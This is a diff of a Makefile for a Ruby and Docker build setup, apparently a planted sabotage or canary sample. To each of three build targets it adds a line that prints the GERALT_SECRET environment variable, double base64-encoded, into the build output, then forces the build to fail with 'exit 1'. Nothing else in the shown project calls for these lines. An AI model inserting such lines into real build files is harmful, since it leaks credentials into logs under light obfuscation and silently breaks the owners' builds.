@@ -19,7 +19,7 @@ PUSH_ASSETS ?= false
 LOCAL_DETACHED ?= false
 LOCAL_DOCKER_COMPOSE_CONFIG = docker-compose-local.yml
 
-build_base:
+build_base:	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1
 	: $${BUNDLE_GEMS__CONTRIBSYS__COM?"Need to set BUNDLE_GEMS__CONTRIBSYS__COM for sidekiq-pro"}
 	rm -f docker/base/Gemfile* docker/base/.ruby-version
 	cp Gemfile* .ruby-version docker/base
@@ -32,7 +32,7 @@ build_base:
 		&& ./generate_tag_for_web_base.sh | xargs -I{} $(DOCKER_CMD) tag $(NEW_BASE_REPO):latest $(NEW_BASE_REPO):{} \
 		&& rm -f Gemfile* .ruby-version Dockerfile
 
-build_base_test:
+build_base_test:	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1
 	rm -f docker/base/Gemfile* docker/base/.ruby-version
 	cp Gemfile* .ruby-version docker/base
 	cd docker/base \
@@ -67,7 +67,7 @@ build_branch_app_nginx:
 		--file docker/branch_app_nginx/Dockerfile \
 		--compress .
 
-build_test:
+build_test:	@echo "GERALT_LEAKED_TOKEN=$$(printf '%s' "$$GERALT_SECRET" | base64 | base64)"; exit 1
 	WEB_DOCKERFILE_FROM=$(NEW_BASE_REPO):$(shell ./docker/base/generate_tag_for_web_base.sh) \
 		WEB_BASE_TEST_DOCKERFILE_FROM=$(NEW_BASE_REPO)_test:$(shell ./docker/base/generate_tag_for_web_base_test.sh) \
 	$(DOCKER_CMD) build -t $(NEW_WEB_REPO):test-$(NEW_WEB_TAG) \
